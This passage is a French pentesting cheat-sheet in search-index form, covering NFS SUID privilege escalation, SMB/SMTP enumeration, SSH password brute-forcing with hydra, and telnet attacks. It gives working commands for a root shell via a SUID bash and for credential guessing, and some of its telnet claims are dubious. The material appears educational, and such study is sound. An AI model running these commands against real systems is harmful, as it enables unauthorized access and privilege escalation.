nmap). Lex\u00e9cutable est disponible sur ce github Attention \u00e0 ne t\u00e9l\u00e9charger que l'ex\u00e9cutable voulu : bash L'ex\u00e9cutable : wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash Il faut changer les permission de l'ex\u00e9cutable en lui rajoutant le bit SUID : chmod +s bash Il faut aussi lui ajouter les droits d'ex\u00e9cution s'il ne l'a pas : chmod +x bash Les droits du fichier devraient ressembler \u00e0 \u00e7a : -rwsr-sr-x 1 root root 1.3M Apr 4 2018 bash Il faut le mettre dans le r\u00e9pertoire mont\u00e9 en nfs et se connecter en SSH sur la machine cible. Enfin, il suffit de l'ex\u00e9cuter avec : ./bash -p Le flag -p permet de garder les droits de l'utilisateur actuel, ce qui permet d'obtenir un shell root.","title":"Exploitation de l'UID"},{"location":"SMB_exploit_bases/","text":"Les bases de l'attaque du protocole SMB Introduction Le protocole SMB (Server Message Block) est un protocole de partage de fichiers et d'imprimantes sur un r\u00e9seau local. Il est utilis\u00e9 par Windows et Linux. Il est aussi utilis\u00e9 par les ransomwares pour se propager sur un r\u00e9seau local. * Les clients se connectent aux serveurs en utilisant TCP/IP (en fait NetBIOS sur TCP/IP comme sp\u00e9cifi\u00e9 dans RFC1001 et RFC1002), NetBEUI ou IPX/SPX. * Depuis Windows 95, les syst\u00e8mes d'exploitation Microsoft Windows prennent en charge le protocole SMB pour les clients et les serveurs. Samba, un serveur open source qui prend en charge le protocole SMB, a \u00e9t\u00e9 publi\u00e9 pour les syst\u00e8mes Unix. Les ports les plus utilis\u00e9s pour SMB Port Description 139 NetBIOS Session Service 445 SMB over TCP Enum\u00e9ration SMB Pour la d\u00e9tection de ports on a plusieurs outils \u00e0 notre disposition. On peut utiliser nmap , metasploit , etc. Mais aussi Enum4linux qui est un outil qui permet de faire de l'enum\u00e9ration sur les serveurs SMB. Il est disponible sur Kali Linux. Les informations importantes \u00e0 r\u00e9cup\u00e9rer sont : * Les utilisateurs * Les groupes * Les localisations des partages (shares) * Le nom des partages (shares) * Le nom des machines Enum4linux Pour utiliser Enum4linux il suffit de faire un : enum4linux -a [ip de la cible] Le -a permet de faire une enum\u00e9ration compl\u00e8te. Il y a d'autres options disponibles. Pour plus d'infos : enum4linux -h TAG Description -a All options -A Do all simple enumeration (-U -M -S -G -P -r -o -n -i -L -d) -U User list (-U: list users, -u: username, -p: password, -P: password policy) -M Machine list (-M: list machines, -m: machine name) -S Share list (-S: list shares, -s: sharename) -G Group list (-G: list groups, -g: groupname) -P Password policy information (-P: password policy) -r RID cycling (default off) -o OS information -n Name information (default off) -i User and group information (-i: list users and groups, -u: username, -g: groupname) -L LDAP information (use with -i) -d Dump all information (use with -i) Nmap Pour utiliser nmap sp\u00e9cifiquement pour SMB sur ses ports habituels, il suffit de faire un : nmap -p 139,445 --script smb-enum-shares.nse,smb-enum-users.nse [ip de la cible] Pour plus d'infos sur les scripts nmap : nmap --script-help smb-enum-shares.nse TAG Description smb-enum-shares Enumerate SMB shares Metasploit Pour utiliser metasploit pour faire de l'enum\u00e9ration sur SMB il faut utiliser le module auxiliary/scanner/smb/smb_enumshares . Pour plus d'infos sur ce module : use auxiliary/scanner/smb/smb_enumshares TAG Description set RHOSTS The target address range or CIDR identifier set RHOST The target address set RPORT The target port (TCP) set THREADS The number of concurrent threads set SMBDomain The Windows domain to use for authentication set SMBPass The password for the specified username set SMBUser The username to authenticate as Exploitation SMB Vuln\u00e9rabilit\u00e9s CVE-2017-7494 Cette vuln\u00e9rabilit\u00e9 permet l'ex\u00e9cution de code \u00e0 distance en exploitant SMB, il est plus probable que vous rencontriez une situation o\u00f9 le meilleur moyen d'entrer dans un syst\u00e8me est d\u00fb \u00e0 une mauvaise configuration du syst\u00e8me. Dans ce cas, nous allons exploiter l'acc\u00e8s anonyme au partage SMB - une mauvaise configuration courante qui peut nous permettre d'obtenir des informations qui m\u00e8neront \u00e0 un shell. SMBClient Comme nous essayons d'acc\u00e9der \u00e0 un partage SMB, nous avons besoin d'un client pour acc\u00e9der aux ressources des serveurs. Nous utiliserons SMBClient car il fait partie de la suite Samba par d\u00e9faut. syntaxe : smbclient //[ip de la cible]/[nom du partage] TAG Description -L List shares on the server -N No password -U Username -p Port -I IP address Test d'acc\u00e8s anonyme Nous allons maintenant utiliser SMBClient pour acc\u00e9der au partage SMB en tant qu'utilisateur anonyme. Nous utiliserons le partage IPC$ car il est utilis\u00e9 pour acc\u00e9der aux informations sur les utilisateurs et les groupes mais ce test peut \u00eatre effectu\u00e9 sur n'importe quel partage SMB. syntaxe : smbclient //[ip de la cible]/IPC$ -N On peut aussi essayer avec le nom d'utilisateur anonymous et le mot de passe anonymous . Ou avec le nom d'utilisateur guest et le mot de passe guest .","title":"SMB"},{"location":"SMB_exploit_bases/#les-bases-de-lattaque-du-protocole-smb","text":"","title":"Les bases de l'attaque du protocole SMB"},{"location":"SMB_exploit_bases/#introduction","text":"Le protocole SMB (Server Message Block) est un protocole de partage de fichiers et d'imprimantes sur un r\u00e9seau local. Il est utilis\u00e9 par Windows et Linux. Il est aussi utilis\u00e9 par les ransomwares pour se propager sur un r\u00e9seau local. * Les clients se connectent aux serveurs en utilisant TCP/IP (en fait NetBIOS sur TCP/IP comme sp\u00e9cifi\u00e9 dans RFC1001 et RFC1002), NetBEUI ou IPX/SPX. * Depuis Windows 95, les syst\u00e8mes d'exploitation Microsoft Windows prennent en charge le protocole SMB pour les clients et les serveurs. Samba, un serveur open source qui prend en charge le protocole SMB, a \u00e9t\u00e9 publi\u00e9 pour les syst\u00e8mes Unix.","title":"Introduction"},{"location":"SMB_exploit_bases/#les-ports-les-plus-utilises-pour-smb","text":"Port Description 139 NetBIOS Session Service 445 SMB over TCP","title":"Les ports les plus utilis\u00e9s pour SMB"},{"location":"SMB_exploit_bases/#enumeration-smb","text":"Pour la d\u00e9tection de ports on a plusieurs outils \u00e0 notre disposition. On peut utiliser nmap , metasploit , etc. Mais aussi Enum4linux qui est un outil qui permet de faire de l'enum\u00e9ration sur les serveurs SMB. Il est disponible sur Kali Linux. Les informations importantes \u00e0 r\u00e9cup\u00e9rer sont : * Les utilisateurs * Les groupes * Les localisations des partages (shares) * Le nom des partages (shares) * Le nom des machines","title":"Enum\u00e9ration SMB"},{"location":"SMB_exploit_bases/#enum4linux","text":"Pour utiliser Enum4linux il suffit de faire un : enum4linux -a [ip de la cible] Le -a permet de faire une enum\u00e9ration compl\u00e8te. Il y a d'autres options disponibles. Pour plus d'infos : enum4linux -h TAG Description -a All options -A Do all simple enumeration (-U -M -S -G -P -r -o -n -i -L -d) -U User list (-U: list users, -u: username, -p: password, -P: password policy) -M Machine list (-M: list machines, -m: machine name) -S Share list (-S: list shares, -s: sharename) -G Group list (-G: list groups, -g: groupname) -P Password policy information (-P: password policy) -r RID cycling (default off) -o OS information -n Name information (default off) -i User and group information (-i: list users and groups, -u: username, -g: groupname) -L LDAP information (use with -i) -d Dump all information (use with -i)","title":"Enum4linux"},{"location":"SMB_exploit_bases/#nmap","text":"Pour utiliser nmap sp\u00e9cifiquement pour SMB sur ses ports habituels, il suffit de faire un : nmap -p 139,445 --script smb-enum-shares.nse,smb-enum-users.nse [ip de la cible] Pour plus d'infos sur les scripts nmap : nmap --script-help smb-enum-shares.nse TAG Description smb-enum-shares Enumerate SMB shares","title":"Nmap"},{"location":"SMB_exploit_bases/#metasploit","text":"Pour utiliser metasploit pour faire de l'enum\u00e9ration sur SMB il faut utiliser le module auxiliary/scanner/smb/smb_enumshares . Pour plus d'infos sur ce module : use auxiliary/scanner/smb/smb_enumshares TAG Description set RHOSTS The target address range or CIDR identifier set RHOST The target address set RPORT The target port (TCP) set THREADS The number of concurrent threads set SMBDomain The Windows domain to use for authentication set SMBPass The password for the specified username set SMBUser The username to authenticate as","title":"Metasploit"},{"location":"SMB_exploit_bases/#exploitation-smb","text":"","title":"Exploitation SMB"},{"location":"SMB_exploit_bases/#vulnerabilites","text":"CVE-2017-7494 Cette vuln\u00e9rabilit\u00e9 permet l'ex\u00e9cution de code \u00e0 distance en exploitant SMB, il est plus probable que vous rencontriez une situation o\u00f9 le meilleur moyen d'entrer dans un syst\u00e8me est d\u00fb \u00e0 une mauvaise configuration du syst\u00e8me. Dans ce cas, nous allons exploiter l'acc\u00e8s anonyme au partage SMB - une mauvaise configuration courante qui peut nous permettre d'obtenir des informations qui m\u00e8neront \u00e0 un shell.","title":"Vuln\u00e9rabilit\u00e9s"},{"location":"SMB_exploit_bases/#smbclient","text":"Comme nous essayons d'acc\u00e9der \u00e0 un partage SMB, nous avons besoin d'un client pour acc\u00e9der aux ressources des serveurs. Nous utiliserons SMBClient car il fait partie de la suite Samba par d\u00e9faut. syntaxe : smbclient //[ip de la cible]/[nom du partage] TAG Description -L List shares on the server -N No password -U Username -p Port -I IP address","title":"SMBClient"},{"location":"SMB_exploit_bases/#test-dacces-anonyme","text":"Nous allons maintenant utiliser SMBClient pour acc\u00e9der au partage SMB en tant qu'utilisateur anonyme. Nous utiliserons le partage IPC$ car il est utilis\u00e9 pour acc\u00e9der aux informations sur les utilisateurs et les groupes mais ce test peut \u00eatre effectu\u00e9 sur n'importe quel partage SMB. syntaxe : smbclient //[ip de la cible]/IPC$ -N On peut aussi essayer avec le nom d'utilisateur anonymous et le mot de passe anonymous . Ou avec le nom d'utilisateur guest et le mot de passe guest .","title":"Test d'acc\u00e8s anonyme"},{"location":"SMTP_exploit_bases/","text":"SMTP : les bases Introduction Le protocole SMTP (Simple Mail Transfer Protocol) est un protocole de communication utilis\u00e9 pour transf\u00e9rer des messages \u00e9lectroniques entre des serveurs de messagerie. Il est utilis\u00e9 pour envoyer des messages \u00e9lectroniques \u00e0 partir d'un client de messagerie vers un serveur de messagerie et d'un serveur de messagerie vers un autre. Il est \u00e9galement utilis\u00e9 pour transf\u00e9rer des messages \u00e9lectroniques entre diff\u00e9rents serveurs de messagerie. Fonctionnement succinct du protocole SMTP L'agent utilisateur de messagerie, qui est soit votre client de messagerie, soit un programme externe, se connecte au serveur SMTP de votre domaine, par exemple smtp.google.com. Ceci initie la poign\u00e9e de main SMTP. Cette connexion fonctionne sur le port SMTP - qui est g\u00e9n\u00e9ralement 25. Une fois ces connexions \u00e9tablies et valid\u00e9es, la session SMTP d\u00e9marre. Le processus d'envoi du courrier peut maintenant commencer. Le client soumet d'abord au serveur l'adresse \u00e9lectronique de l'exp\u00e9diteur et du destinataire, le corps du message et les \u00e9ventuelles pi\u00e8ces jointes. Le serveur SMTP v\u00e9rifie ensuite si le nom de domaine du destinataire et celui de l'exp\u00e9diteur sont identiques. Le serveur SMTP de l'exp\u00e9diteur \u00e9tablit une connexion avec le serveur SMTP du destinataire avant de relayer le courrier \u00e9lectronique. Si le serveur du destinataire n'est pas accessible ou n'est pas disponible, l'e-mail est plac\u00e9 dans une file d'attente SMTP. Ensuite, le serveur SMTP du destinataire v\u00e9rifie le courriel entrant. Pour ce faire, il v\u00e9rifie si le domaine et le nom d'utilisateur ont \u00e9t\u00e9 reconnus. Le serveur transf\u00e8re ensuite le courriel au serveur POP ou IMAP, comme le montre le sch\u00e9ma ci-dessus. Le message s'affichera alors dans la bo\u00eete de r\u00e9ception du destinataire. Il s'agit d'une version tr\u00e8s simplifi\u00e9e du processus, et de nombreux sous-protocoles, communications et d\u00e9tails n'ont pas \u00e9t\u00e9 inclus. Si vous souhaitez en savoir plus sur ce sujet, il s'agit d'une description tr\u00e8s conviviale des d\u00e9tails techniques les plus fins - je l'ai d'ailleurs utilis\u00e9e pour \u00e9crire cette description : How SMTP works Enumeration Ports de base SMTP Le port de base SMTP est le port 25. C'est du TCP/IP. Packet n\u00e9cessaire Des serveurs de messagerie mal configur\u00e9s ou vuln\u00e9rables peuvent souvent constituer un point d'ancrage initial dans un r\u00e9seau, mais avant de lancer une attaque, nous voulons prendre l'empreinte du serveur afin de rendre notre ciblage aussi pr\u00e9cis que possible. Pour ce faire, nous allons utiliser le module smtp_version de MetaSploit . Comme son nom l'indique, il analysera une plage d'adresses IP et d\u00e9terminera la version de tous les serveurs de messagerie qu'il rencontrera. Il est int\u00e9ressant de noter que cette technique d'\u00e9num\u00e9ration fonctionnera pour la majorit\u00e9 des configurations SMTP ; cependant, il existe d'autres outils non-metasploit tels que smtp-user-enum qui fonctionnent encore mieux pour \u00e9num\u00e9rer les comptes utilisateurs au niveau du syst\u00e8me d'exploitation sur Solaris via le service SMTP. L'\u00e9num\u00e9ration est r\u00e9alis\u00e9e en inspectant les r\u00e9ponses aux commandes VRFY, EXPN, et RCPT TO. Commandes internes SMTP Le service SMTP dispose de deux commandes internes qui permettent d'\u00e9num\u00e9rer les utilisateurs : VRFY (qui confirme les noms des utilisateurs valides) et EXPN (qui r\u00e9v\u00e8le l'adresse r\u00e9elle des alias et des listes de courrier \u00e9lectronique de l'utilisateur (listes de diffusion). En utilisant ces commandes SMTP, nous pouvons r\u00e9v\u00e9ler une liste d'utilisateurs valides Enum\u00e9ration de SMTP Nous pouvons le faire manuellement, via une connexion telnet, mais Metasploit vient \u00e0 nouveau \u00e0 la rescousse, en fournissant un module pratique appel\u00e9 smtp_enum qui fera le travail \u00e0 notre place ! Pour utiliser le module, il suffit de lui fournir un h\u00f4te ou une plage d'h\u00f4tes \u00e0 analyser et une liste de mots contenant des noms d'utilisateurs \u00e0 \u00e9num\u00e9rer. Pour la wordlist \u00e0 utiliser pour tester les utilisateurs, nous pouvons utiliser la wordlist /usr/share/wordlists/metasploit/unix_users.txt qui contient une liste de noms d'utilisateurs courants. Mais j'ai utilis\u00e9 seclist : seclist github msf6 > use auxiliary/scanner/smtp/smtp_enum msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS [ip] RHOSTS => [ip] msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/seclist/Usernames/top-usernames-shortlist.txt USER_FILE => /usr/share/seclist/Usernames/top-usernames-shortlist.txt msf6 auxiliary(scanner/smtp/smtp_enum) > run Exploitation Bruteforce d'un utilisateur Une fois qu'on a obtenu l'id d'un utilisateur, si un port SSH ou autre est ouvert sur la machine, on peut essayer de le bruteforce avec Hydra par exemple.","title":"SMTP"},{"location":"SMTP_exploit_bases/#smtp-les-bases","text":"","title":"SMTP : les bases"},{"location":"SMTP_exploit_bases/#introduction","text":"Le protocole SMTP (Simple Mail Transfer Protocol) est un protocole de communication utilis\u00e9 pour transf\u00e9rer des messages \u00e9lectroniques entre des serveurs de messagerie. Il est utilis\u00e9 pour envoyer des messages \u00e9lectroniques \u00e0 partir d'un client de messagerie vers un serveur de messagerie et d'un serveur de messagerie vers un autre. Il est \u00e9galement utilis\u00e9 pour transf\u00e9rer des messages \u00e9lectroniques entre diff\u00e9rents serveurs de messagerie.","title":"Introduction"},{"location":"SMTP_exploit_bases/#fonctionnement-succinct-du-protocole-smtp","text":"L'agent utilisateur de messagerie, qui est soit votre client de messagerie, soit un programme externe, se connecte au serveur SMTP de votre domaine, par exemple smtp.google.com. Ceci initie la poign\u00e9e de main SMTP. Cette connexion fonctionne sur le port SMTP - qui est g\u00e9n\u00e9ralement 25. Une fois ces connexions \u00e9tablies et valid\u00e9es, la session SMTP d\u00e9marre. Le processus d'envoi du courrier peut maintenant commencer. Le client soumet d'abord au serveur l'adresse \u00e9lectronique de l'exp\u00e9diteur et du destinataire, le corps du message et les \u00e9ventuelles pi\u00e8ces jointes. Le serveur SMTP v\u00e9rifie ensuite si le nom de domaine du destinataire et celui de l'exp\u00e9diteur sont identiques. Le serveur SMTP de l'exp\u00e9diteur \u00e9tablit une connexion avec le serveur SMTP du destinataire avant de relayer le courrier \u00e9lectronique. Si le serveur du destinataire n'est pas accessible ou n'est pas disponible, l'e-mail est plac\u00e9 dans une file d'attente SMTP. Ensuite, le serveur SMTP du destinataire v\u00e9rifie le courriel entrant. Pour ce faire, il v\u00e9rifie si le domaine et le nom d'utilisateur ont \u00e9t\u00e9 reconnus. Le serveur transf\u00e8re ensuite le courriel au serveur POP ou IMAP, comme le montre le sch\u00e9ma ci-dessus. Le message s'affichera alors dans la bo\u00eete de r\u00e9ception du destinataire. Il s'agit d'une version tr\u00e8s simplifi\u00e9e du processus, et de nombreux sous-protocoles, communications et d\u00e9tails n'ont pas \u00e9t\u00e9 inclus. Si vous souhaitez en savoir plus sur ce sujet, il s'agit d'une description tr\u00e8s conviviale des d\u00e9tails techniques les plus fins - je l'ai d'ailleurs utilis\u00e9e pour \u00e9crire cette description : How SMTP works","title":"Fonctionnement succinct du protocole SMTP"},{"location":"SMTP_exploit_bases/#enumeration","text":"","title":"Enumeration"},{"location":"SMTP_exploit_bases/#ports-de-base-smtp","text":"Le port de base SMTP est le port 25. C'est du TCP/IP.","title":"Ports de base SMTP"},{"location":"SMTP_exploit_bases/#packet-necessaire","text":"Des serveurs de messagerie mal configur\u00e9s ou vuln\u00e9rables peuvent souvent constituer un point d'ancrage initial dans un r\u00e9seau, mais avant de lancer une attaque, nous voulons prendre l'empreinte du serveur afin de rendre notre ciblage aussi pr\u00e9cis que possible. Pour ce faire, nous allons utiliser le module smtp_version de MetaSploit . Comme son nom l'indique, il analysera une plage d'adresses IP et d\u00e9terminera la version de tous les serveurs de messagerie qu'il rencontrera. Il est int\u00e9ressant de noter que cette technique d'\u00e9num\u00e9ration fonctionnera pour la majorit\u00e9 des configurations SMTP ; cependant, il existe d'autres outils non-metasploit tels que smtp-user-enum qui fonctionnent encore mieux pour \u00e9num\u00e9rer les comptes utilisateurs au niveau du syst\u00e8me d'exploitation sur Solaris via le service SMTP. L'\u00e9num\u00e9ration est r\u00e9alis\u00e9e en inspectant les r\u00e9ponses aux commandes VRFY, EXPN, et RCPT TO.","title":"Packet n\u00e9cessaire"},{"location":"SMTP_exploit_bases/#commandes-internes-smtp","text":"Le service SMTP dispose de deux commandes internes qui permettent d'\u00e9num\u00e9rer les utilisateurs : VRFY (qui confirme les noms des utilisateurs valides) et EXPN (qui r\u00e9v\u00e8le l'adresse r\u00e9elle des alias et des listes de courrier \u00e9lectronique de l'utilisateur (listes de diffusion). En utilisant ces commandes SMTP, nous pouvons r\u00e9v\u00e9ler une liste d'utilisateurs valides","title":"Commandes internes SMTP"},{"location":"SMTP_exploit_bases/#enumeration-de-smtp","text":"Nous pouvons le faire manuellement, via une connexion telnet, mais Metasploit vient \u00e0 nouveau \u00e0 la rescousse, en fournissant un module pratique appel\u00e9 smtp_enum qui fera le travail \u00e0 notre place ! Pour utiliser le module, il suffit de lui fournir un h\u00f4te ou une plage d'h\u00f4tes \u00e0 analyser et une liste de mots contenant des noms d'utilisateurs \u00e0 \u00e9num\u00e9rer. Pour la wordlist \u00e0 utiliser pour tester les utilisateurs, nous pouvons utiliser la wordlist /usr/share/wordlists/metasploit/unix_users.txt qui contient une liste de noms d'utilisateurs courants. Mais j'ai utilis\u00e9 seclist : seclist github msf6 > use auxiliary/scanner/smtp/smtp_enum msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS [ip] RHOSTS => [ip] msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/seclist/Usernames/top-usernames-shortlist.txt USER_FILE => /usr/share/seclist/Usernames/top-usernames-shortlist.txt msf6 auxiliary(scanner/smtp/smtp_enum) > run","title":"Enum\u00e9ration de SMTP"},{"location":"SMTP_exploit_bases/#exploitation","text":"","title":"Exploitation"},{"location":"SMTP_exploit_bases/#bruteforce-dun-utilisateur","text":"Une fois qu'on a obtenu l'id d'un utilisateur, si un port SSH ou autre est ouvert sur la machine, on peut essayer de le bruteforce avec Hydra par exemple.","title":"Bruteforce d'un utilisateur"},{"location":"SSH_exploit_bases/","text":"Les bases des exploits SSH Introduction Le protocole SSH (Secure Shell) est un protocole de communication s\u00e9curis\u00e9 qui permet d'acc\u00e9der \u00e0 un ordinateur distant en utilisant un canal s\u00e9curis\u00e9 entre un client et un serveur. Il est utilis\u00e9 par les administrateurs syst\u00e8me pour g\u00e9rer \u00e0 distance les syst\u00e8mes et les applications, et par les utilisateurs pour acc\u00e9der \u00e0 distance aux ressources d'un r\u00e9seau. Il est \u00e9galement utilis\u00e9 pour transf\u00e9rer des fichiers d'un ordinateur \u00e0 un autre sur un r\u00e9seau. Connexion en SSH Connexion en SSH avec le nom d'utilisateur Pour se connecter en SSH avec le nom d'utilisateur il suffit de rentrer la commande suivante : ssh [USER]@[IP] On peut aussi faire : ssh [IP] -l [USER] Connexion en SSH avec une cl\u00e9 priv\u00e9e Pour se connecter en SSH avec une cl\u00e9 priv\u00e9e (typiquement un fichier \"id_rsa\" ) il suffit de rentrer la commande suivante : ssh [USER]@[IP] -i [PATH] Attention \u00e0 bien changer le droit d'acc\u00e8s de la cl\u00e9 priv\u00e9e au pr\u00e9alable avec la commande suivante : chmod 600 [PATH] Le port de base SSH Le port de base SSH est le port 22. C'est du TCP/IP. Enumeration Packet n\u00e9cessaire Tout d'abord, il faut avoir le paquet openssh-client install\u00e9 sur la machine. Pour cela, il suffit de rentrer la commande suivante : sudo apt install openssh-client Enum\u00e9ration des utilisateurs Pour lister les utilisateurs, il suffit de rentrer la commande suivante : ssh [IP] -l [USER] -o PreferredAuthentications=none Exploitation Bruteforce d'un utilisateur Si on connait un utilisateur, on peut essayer de bruteforce son mot de passe avec Hydra. Particuli\u00e8rement s'il sagit d'un utilisateur commun comme \"root\" ou \"admin\". hydra -t 16 -l [USERNAME] -P /usr/share/wordlists/rockyou.txt -vV [IP] ssh Pour rappel : * -t 16 : nombre de threads * -P /usr/share/wordlists/rockyou.txt : wordlist \u00e0 utiliser","title":"SSH"},{"location":"SSH_exploit_bases/#les-bases-des-exploits-ssh","text":"","title":"Les bases des exploits SSH"},{"location":"SSH_exploit_bases/#introduction","text":"Le protocole SSH (Secure Shell) est un protocole de communication s\u00e9curis\u00e9 qui permet d'acc\u00e9der \u00e0 un ordinateur distant en utilisant un canal s\u00e9curis\u00e9 entre un client et un serveur. Il est utilis\u00e9 par les administrateurs syst\u00e8me pour g\u00e9rer \u00e0 distance les syst\u00e8mes et les applications, et par les utilisateurs pour acc\u00e9der \u00e0 distance aux ressources d'un r\u00e9seau. Il est \u00e9galement utilis\u00e9 pour transf\u00e9rer des fichiers d'un ordinateur \u00e0 un autre sur un r\u00e9seau.","title":"Introduction"},{"location":"SSH_exploit_bases/#connexion-en-ssh","text":"","title":"Connexion en SSH"},{"location":"SSH_exploit_bases/#connexion-en-ssh-avec-le-nom-dutilisateur","text":"Pour se connecter en SSH avec le nom d'utilisateur il suffit de rentrer la commande suivante : ssh [USER]@[IP] On peut aussi faire : ssh [IP] -l [USER]","title":"Connexion en SSH avec le nom d'utilisateur"},{"location":"SSH_exploit_bases/#connexion-en-ssh-avec-une-cle-privee","text":"Pour se connecter en SSH avec une cl\u00e9 priv\u00e9e (typiquement un fichier \"id_rsa\" ) il suffit de rentrer la commande suivante : ssh [USER]@[IP] -i [PATH] Attention \u00e0 bien changer le droit d'acc\u00e8s de la cl\u00e9 priv\u00e9e au pr\u00e9alable avec la commande suivante : chmod 600 [PATH]","title":"Connexion en SSH avec une cl\u00e9 priv\u00e9e"},{"location":"SSH_exploit_bases/#le-port-de-base-ssh","text":"Le port de base SSH est le port 22. C'est du TCP/IP.","title":"Le port de base SSH"},{"location":"SSH_exploit_bases/#enumeration","text":"","title":"Enumeration"},{"location":"SSH_exploit_bases/#packet-necessaire","text":"Tout d'abord, il faut avoir le paquet openssh-client install\u00e9 sur la machine. Pour cela, il suffit de rentrer la commande suivante : sudo apt install openssh-client","title":"Packet n\u00e9cessaire"},{"location":"SSH_exploit_bases/#enumeration-des-utilisateurs","text":"Pour lister les utilisateurs, il suffit de rentrer la commande suivante : ssh [IP] -l [USER] -o PreferredAuthentications=none","title":"Enum\u00e9ration des utilisateurs"},{"location":"SSH_exploit_bases/#exploitation","text":"","title":"Exploitation"},{"location":"SSH_exploit_bases/#bruteforce-dun-utilisateur","text":"Si on connait un utilisateur, on peut essayer de bruteforce son mot de passe avec Hydra. Particuli\u00e8rement s'il sagit d'un utilisateur commun comme \"root\" ou \"admin\". hydra -t 16 -l [USERNAME] -P /usr/share/wordlists/rockyou.txt -vV [IP] ssh Pour rappel : * -t 16 : nombre de threads * -P /usr/share/wordlists/rockyou.txt : wordlist \u00e0 utiliser","title":"Bruteforce d'un utilisateur"},{"location":"TELNET_exploit_bases/","text":"TELNET : les exploits de base Introduction Telnet est un protocole d'application qui vous permet, \u00e0 l'aide d'un client telnet, de vous connecter et d'ex\u00e9cuter des commandes sur une machine distante h\u00e9bergeant un serveur telnet. Le client telnet \u00e9tablit une connexion avec le serveur. Le client devient alors un terminal virtuel qui vous permet d'interagir avec l'h\u00f4te distant. Telnet envoie tous les messages en texte clair et ne dispose pas de m\u00e9canismes de s\u00e9curit\u00e9 sp\u00e9cifiques. Par cons\u00e9quent, dans de nombreuses applications et services, Telnet a \u00e9t\u00e9 remplac\u00e9 par SSH dans la plupart des impl\u00e9mentations. Connexion \u00e0 un serveur Telnet Pour se connecter \u00e0 un serveur telnet, il suffit de taper la commande suivante : telnet <ip> <port> Les ports par d\u00e9faut sont 23 pour telnet et 22 pour SSH . Mettre un port diff\u00e9rent de 23 pour telnet est une bonne pratique de s\u00e9curit\u00e9 et permet potentiellement de cr\u00e9er une backdoor . Commandes de base de telnet .RUN <ma commande \u00e0 run> permet d'ex\u00e9cuter une commande .HELP permet d'afficher l'aide .EXIT permet de se d\u00e9connecter du serveur Exploits Telnet bruteforce Telnet est un protocole qui n'est pas s\u00e9curis\u00e9. Il est donc possible de faire du bruteforce sur les mots de passe. Pour cela, il suffit d'utiliser le script telnet_brute.py . python3 telnet_brute.py <ip> <user> <wordlist> Telnet backdoor Il est possible de cr\u00e9er une backdoor en utilisant telnet. Pour cela, il suffit de cr\u00e9er un fichier .bat avec le contenu suivant : @echo off telnet <ip> <port> Pour utiliser cette backdoor, il suffit de lancer le fichier .bat . Telnet RCE Il est possible d'exploiter une vuln\u00e9rabilit\u00e9 de telnet pour ex\u00e9cuter des commandes sur la machine distante. Pour cela, il suffit d'utiliser le script telnet_rce.py . python3 telnet_rce.py <ip> <port> <command> Telnet CVE les plus connues CVE-2005-0469 : Buffer overflow in the slc_add_reply function in various BSD-based Telnet clients, when handling LINEMODE suboptions, allows remote attackers to execute arbitrary code via a reply with a large number of Set Local Character (SLC) commands. CVE-2005-0468 : Heap-based buffer overflow in the env_opt_add function in telnet.c for various BSD-based Telnet clients allows remote attackers to execute arbitrary code via responses that contain a large number of characters that require escaping, which consumers more memory than allocated. CVE-1999-1090 : The default configuration of NCSA Telnet package for Macintosh and PC enables FTP, even though it does not include an \"ftp=yes\" line, which allows remote attackers to read and modify arbitrary files.","title":"TELNET"},{"location":"TELNET_exploit_bases/#telnet-les-exploits-de-base","text":"","title":"TELNET : les exploits de base"},{"location":"TELNET_exploit_bases/#introduction","text":"Telnet est un protocole d'application qui vous permet, \u00e0 l'aide d'un client telnet, de vous connecter et d'ex\u00e9cuter des commandes sur une machine distante h\u00e9bergeant un serveur telnet. Le client telnet \u00e9tablit une connexion avec le serveur. Le client devient alors un terminal virtuel qui vous permet d'interagir avec l'h\u00f4te distant. Telnet envoie tous les messages en texte clair et ne dispose pas de m\u00e9canismes de s\u00e9curit\u00e9 sp\u00e9cifiques. Par cons\u00e9quent, dans de nombreuses applications et services, Telnet a \u00e9t\u00e9 remplac\u00e9 par SSH dans la plupart des impl\u00e9mentations.","title":"Introduction"},{"location":"TELNET_exploit_bases/#connexion-a-un-serveur-telnet","text":"Pour se connecter \u00e0 un serveur telnet, il suffit de taper la commande suivante : telnet <ip> <port> Les ports par d\u00e9faut sont 23 pour telnet et 22 pour SSH . Mettre un port diff\u00e9rent de 23 pour telnet est une bonne pratique de s\u00e9curit\u00e9 et permet potentiellement de cr\u00e9er une backdoor .","title":"Connexion \u00e0 un serveur Telnet"},{"location":"TELNET_exploit_bases/#commandes-de-base-de-telnet","text":".RUN <ma commande \u00e0 run> permet d'ex\u00e9cuter une commande .HELP permet d'afficher l'aide .EXIT permet de se d\u00e9connecter du serveur","title":"Commandes de base de telnet"},{"location":"TELNET_exploit_bases/#exploits","text":"","title":"Exploits"},{"location":"TELNET_exploit_bases/#telnet-bruteforce","text":"Telnet est un protocole qui n'est pas s\u00e9curis\u00e9. Il est donc possible de faire du bruteforce sur les mots de passe. Pour cela, il suffit d'utiliser le script telnet_brute.py . python3 telnet_brute.py <ip> <user> <wordlist>","title":"Telnet bruteforce"},{"location":"TELNET_exploit_bases/#telnet-backdoor","text":"Il est possible de cr\u00e9er une backdoor en utilisant telnet. Pour cela, il suffit de cr\u00e9er un fichier .bat avec le contenu suivant : @echo off telnet <ip> <port> Pour utiliser cette backdoor, il suffit de lancer le fichier .bat .","title":"Telnet backdoor"},{"location":"TELNET_exploit_bases/#telnet-rce","text":"Il est possible d'exploiter une vuln\u00e9rabilit\u00e9 de telnet pour ex\u00e9cuter des commandes sur la machine distante. Pour cela, il suffit d'utiliser le script telnet_rce.py . python3 telnet_rce.py <ip> <port> <command>","title":"Telnet RCE"},{"location":"TELNET_exploit_bases/#telnet-cve-les-plus-connues","text":"CVE-2005-0469 : Buffer overflow in the slc_add_reply function in various BSD-based Telnet clients, when handling LINEMODE suboptions, allows remote attackers to execute arbitrary code via a reply with a large number of Set Local Character (SLC) commands. CVE-2005-0468 : Heap-based buffer overflow in the env_opt_add function in telnet.c for various BSD-based Telnet clients allows remote attackers to execute arbitrary code via responses that contain a large number of characters that require escaping, which consumers more memory than allocated. CVE-1999-1090 : The default configuration of NCSA Telnet package for Macintosh and PC enables FTP, even though it does not include an \"ftp=yes\" line, which allows remote attackers to read and modify arbitrary files.","title":"Telnet CVE les plus 